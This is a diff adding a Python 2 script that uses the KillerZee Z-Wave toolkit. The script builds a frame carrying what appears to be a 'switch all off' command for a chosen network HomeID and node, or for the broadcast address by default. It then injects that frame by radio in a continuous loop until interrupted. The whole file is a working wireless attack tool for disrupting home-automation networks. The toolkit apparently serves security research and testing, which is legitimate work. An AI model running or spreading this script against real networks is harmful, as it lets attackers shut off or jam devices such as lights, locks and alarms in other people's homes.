@@ -1,0 +1,69 @@
+#!/usr/bin/env python
+import sys
+import argparse
+from killerzee import *
+from signal import *
+from datetime import *
+import binascii
+import time
+
+sigstop=False
+
+def sighandler(signal, frame):
+    global sigstop
+    sigstop=True
+
+if __name__ == "__main__":
+    signal(SIGINT, sighandler)
+    packetcount=0
+    destid=None
+
+    # Command-line arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--homeid', dest='homeid', action='store', help='target network HomeID')
+    parser.add_argument('-d', '--destid', dest='destid', action='store', help='target device (optional)')
+    parser.add_argument('-p', '--profile', dest='rfprofile', action='store', default="R2", help='specify the RF profile (one or R1, R2, or R3)')
+    parser.add_argument('-c', '--country', dest='countrycode', action='store', default="US", help='specify the 2-letter country code')
+
+    args = parser.parse_args()
+
+    if args.rfprofile is not None:
+        if args.rfprofile.upper() == 'R1':
+            args.rfprofile = RFPROFILE_R1
+        elif args.rfprofile.upper() == 'R2':
+            args.rfprofile = RFPROFILE_R2
+        elif args.rfprofile.upper() == 'R3':
+            args.rfprofile = RFPROFILE_R3
+        else:
+            print >>sys.stderr, "ERROR: Invalid RF Profile Specified: %s"%args.rfprofile
+            sys.exit(1)
+
+    if not args.homeid:
+        print >>sys.stderr, "Must specify a HomeID with -t"
+        sys.exit(1)
+    if len(args.homeid) != 8:
+        print >>sys.stderr, "Length of HomeID should be 4 bytes (8 hex characters)"
+        sys.exit(1)
+    homeid = args.homeid.decode('hex')
+
+
+    if args.destid is not None:
+        if len(args.destid) != 2:
+            print >>sys.stderr, "Destination NodeID must be 1 byte (2 hex characters)"
+            sys.exit(1)
+        destid = args.destid.decode('hex')
+        print "Targeting the node at",args.destid
+    else:
+        destid = "\xff"
+        print "Targeting the broadcast address"
+
+    kz = KillerZee(countrycode=args.countrycode,rfprofile=args.rfprofile)
+    packet = homeid + "\x00" + "\x41\x00" + "\x0c" + destid + "\x27\x05"
+
+    print "Transmitting the following content repeatedly:"
+    print hexdump(packet)
+    while not sigstop:
+        kz.inject(packet)
+        packetcount+=1
+
+    print "Transmitted %d packets."%packetcount
